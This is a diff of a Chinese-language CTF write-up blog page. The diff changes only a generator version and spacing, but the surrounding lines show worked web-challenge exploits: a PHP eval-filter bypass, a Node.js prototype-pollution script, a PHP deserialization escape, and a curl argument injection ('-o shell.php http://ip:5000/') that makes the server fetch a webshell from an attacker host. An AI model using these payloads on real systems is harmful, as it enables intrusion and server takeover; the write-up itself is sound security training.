@@ -29,7 +29,7 @@
 
     <script src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 5.3.0">
+<meta name="generator" content="Hexo 5.4.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 </head>
 
@@ -419,6 +419,7 @@
     <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;hr&gt;'</span><span class="token punctuation">;</span>
 
     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <blockquote>
 <p>第一个if：判断是否传参变量flag，没有就输出$exam和一些html<br>第二个if：判断flag变量的长度是否和$exam的长度相等<br>第三个if：过滤一些关键字符<br>第四个if：eval执行flag变量里面的内容，并且要等于flag变量的SHA-1散列</p>
 </blockquote>
@@ -433,9 +434,11 @@
 <span class="token number">1.</span><span class="token operator">&lt;</span><span class="token operator">?</span>php <span class="token keyword">echo</span> <span class="token string double-quoted-string">"abc"</span><span class="token delimiter important">?&gt;</span></span>
 2.<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token string double-quoted-string">"abc"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>
 //上面两个语句都是输出abc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>首先点击<code>clickhere</code>获取$exam的值<code>return’5e22e75193f17cf3e608058536d49e4a7fd7dc56’;</code></p>
 <p>payload:</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">?flag=$w=blag;$w{0}=f;?&gt;888888888888888888888;<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$$w</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 
 
 <h2 id="sodirty"><a href="#sodirty" class="headerlink" title="sodirty"></a>sodirty</h2><p>打开网页后没有任何有用信息</p>
@@ -498,6 +501,7 @@ router<span class="token punctuation">.</span><span class="token function">post<
 <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <blockquote>
 <p>1.注册跳转至”/reg”会创建一个challenger用户字典<br>2.”/update”可以对challenger传参键值对（attrkey和attrval），对challenger字典中进行修改<br>3.”/getflag”可以获取到flag，但存在几个验证，首先需要传参两个参数（key和password）进来，并且对用户字典中的年龄进行判断，大于79会失败；其次Admin[key]需要等于password，而body.password未知</p>
 </blockquote>
@@ -525,6 +529,7 @@ module<span class="token punctuation">.</span>exports <span class="token operato
             res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"密码错误，请使用管理员用户名登录."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>到这里卡住了很久，搜索之后才发现这里有个JS原型链污染漏洞</p>
 <p>参考：</p>
 <blockquote>
@@ -550,6 +555,7 @@ r <span class="token operator">=</span> req<span class="token punctuation">.</sp
 
 r <span class="token operator">=</span> req<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"/getflag"</span><span class="token punctuation">,</span>json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"key"</span><span class="token punctuation">:</span><span class="token string">"pwd22"</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"pwd"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210221193537635.png"></p>
 <h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a>web41</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token comment">// php版本:5.4.44</span>
@@ -612,19 +618,24 @@ r <span class="token operator">=</span> req<span class="token punctuation">.</sp
 
 <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>evil类中有一个hint.php</p>
 <p>但是下面可以自由控制的变量只有User类中的两个变量，并不能直接输入反序列化后的字符串。</p>
 <p>进行反序列化操作前，会对序列化字符串进行两次str_replace，将字符串中的<code>\0\0\0</code>和<code>chr(0)</code>相互替换。这一操作原本的用意是为了防止数据库无法处理NULL字节，但是加入我们构造用户名时输入转义字符<code>\\0\\0\\0</code>，就不再是空字节，而是<code>'\'+'0'</code>，这样依旧会被str_replace，但是字符串长度却由<code>\0\0\0(6 bytes)</code>变成了<code>chr(0)*chr(0)(3 bytes)</code></p>
 <p>由于反序列化前使用了str_replace来处理字符串，如果用户输入了转义后的字符串<code>\\0\\0\\0</code>，就会导致长度不正确，也就产生了溢出。</p>
 <p>这样就可以通过构造Username和password来实例化evil类。</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"User"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">60</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"peri0d*********"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"password"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">48</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1234"</span><span class="token punctuation">;</span><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"evil"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"hint"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"hint.php"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span>"<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>base64：</p>
 <pre class="line-numbers language-none"><code class="language-none">PD9waHAKICRoaW50ID0gImluZGV4LmNnaSI7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>解密后：</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;?php
  $hint = "index.cgi";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>访问得到：</p>
 <pre class="line-numbers language-none"><code class="language-none">{ "args": { "name": "Bob" }, "headers": { "Accept": "*/*", "Host": "httpbin.org", "User-Agent": "curl/7.64.0", "X-Amzn-Trace-Id": "Root=1-60325113-7f66a0210d7cd3ad197668c5" }, "origin": "114.67.246.176", "url": "http://httpbin.org/get?name=Bob" }<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>利用curl的参数来getshell</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
 <span class="token keyword">from</span> werkzeug<span class="token punctuation">.</span>routing <span class="token keyword">import</span> BaseConverter
@@ -642,9 +653,11 @@ app<span class="token punctuation">.</span>url_map<span class="token punctuation
 
 <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
     app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>让其返回一句话木马，放在公网ip上，通过-o参数，即可将其写入到服务器上。</p>
 <p>payload：</p>
 <pre class="line-numbers language-none"><code class="language-none">?name=a -o shell.php http://ip:5000/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>最后拿蚁剑连接</p>
 
                 
